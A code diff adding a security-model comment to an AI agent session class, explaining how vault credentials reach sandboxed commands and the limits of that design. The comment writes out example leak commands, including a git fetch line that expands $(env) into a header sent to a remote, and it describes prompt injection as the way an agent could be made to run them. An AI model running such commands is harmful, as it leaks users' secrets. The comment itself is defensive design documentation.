@@ -1524,7 +1524,41 @@ export class SessionDO extends Agent<Env, SessionState> {
         }
       }
 
-      // Register command_secret credentials from vaults
+      // Register command_secret credentials from vaults.
+      //
+      // SECURITY MODEL — known limitation worth understanding:
+      //
+      // Unlike outbound HTTPS credentials (mcp_oauth / static_bearer)
+      // which are now resolved live in main worker via the MAIN_MCP RPC
+      // and never touch the sandbox, `command_secret` credentials are
+      // injected into the sandbox container's per-command process env.
+      // The agent worker holds the plaintext token in
+      // `state.vault_credentials` and `registerCommandSecrets` stashes
+      // it in the sandbox SDK's in-memory map (not in a persistent
+      // container env var — `env | grep TOKEN` from the sandbox shell
+      // returns nothing).
+      //
+      // The injection only fires when the model executes a single
+      // simple command whose binary name exactly matches the registered
+      // prefix (sandbox.ts:getSimpleCommandName parses the AST). Shell
+      // composition (`&&`, `;`, `|`, redirects) blocks injection — the
+      // model gets a hint to retry as a single command. This stops
+      // casual `git status && env > /tmp/leak` exfiltration.
+      //
+      // What this DOESN'T stop: targeted prompt-injection that crafts
+      // single-command-form leak vectors specific to the binary, e.g.
+      //   git fetch -c http.extraHeader="x-leak: $(env)"
+      // Shell expands `$(env)` in the registered exec context (which
+      // has the secret in env), then git sends the captured env as a
+      // header to the upstream remote. Per-binary mitigation would
+      // need an allowlist of safe arg shapes.
+      //
+      // Until we move command_secret to the same out-of-sandbox proxy
+      // pattern as MCP/outbound (sandbox runs the command, agent worker
+      // reverse-RPCs to main when the binary asks for the credential
+      // via stdin/file rather than env), DO NOT attach high-blast-radius
+      // tokens (org-wide GitHub PAT, prod database creds, etc.) to
+      // agents that handle untrusted input. Use scoped repo tokens, etc.
       const vaultIds = this.state.vault_ids;
       if (vaultIds.length && sandbox.registerCommandSecrets) {
         const creds = await this.getVaultCredentials(vaultIds);
